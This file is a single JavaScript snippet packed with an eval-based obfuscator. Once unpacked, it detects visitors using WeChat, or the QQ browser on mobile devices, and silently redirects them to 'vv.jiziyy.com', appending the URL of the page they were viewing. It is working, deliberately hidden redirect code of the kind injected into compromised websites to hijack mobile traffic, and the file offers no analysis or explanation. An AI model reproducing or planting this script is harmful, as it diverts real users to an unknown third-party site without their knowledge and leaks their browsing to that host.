eval(function(p, a, c, k, e, r) {
    e = function(c) {
        return (c < 62 ? '' : e(parseInt(c / 62))) + ((c = c % 62) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
    }
    ;
    if ('0'.replace(0, e) == 0) {
        while (c--)
            r[e(c)] = k[c];
        k = [function(e) {
            return r[e] || e
        }
        ];
        e = function() {
            return '[5-9a-hj-zA-H]'
        }
        ;
        c = 1
    }
    ;while (c--)
        if (k[c])
            p = p.replace(new RegExp('\\b' + e(c) + '\\b','g'), k[c]);
    return p
}('a h(){7 j=b.c.d.e();f(j.5(/MicroMessenger/i)==\'micromessenger\'){8 true}else{8 false}}a k(){7 6=c.d.e(),l=6.5(/m/i)=="m",n=6.5(/o p/i)=="o p",q=6.5(/r/i)=="r",s=6.5(/t:1.2.3.4/i)=="t:1.2.3.4",u=6.5(/v/i)=="v",w=6.5(/x/i)=="x",y=6.5(/9 z/i)=="9 z",A=6.5(/9 B/i)=="9 B",bIsWebview=6.5(/C/i)=="C";8(l||n||q||s||u||w||y||A)}7 D=(a(){8 c.d.e().indexOf(\' qq\')!==-1})();7 g=0;f(D&&k())g=1;f(h()||g==1){E=b.F.G;7 H=\'http://vv.jiziyy.com/index.php?url=\'+E;b.F.G=H}', [], 44, '|||||match|sUserAgent|var|return|windows|function|window|navigator|userAgent|toLowerCase|if|qq_m|isWeiXin||ua|isMobile|bIsIpad|ipad|bIsIphoneOs|iphone|os|bIsMidp|midp|bIsUc7|rv|bIsUc|ucweb|bIsAndroid|android|bIsCE|ce|bIsWM|mobile|webview|is_qq|url_new|location|href|URL_1'.split('|'), 0, {}))
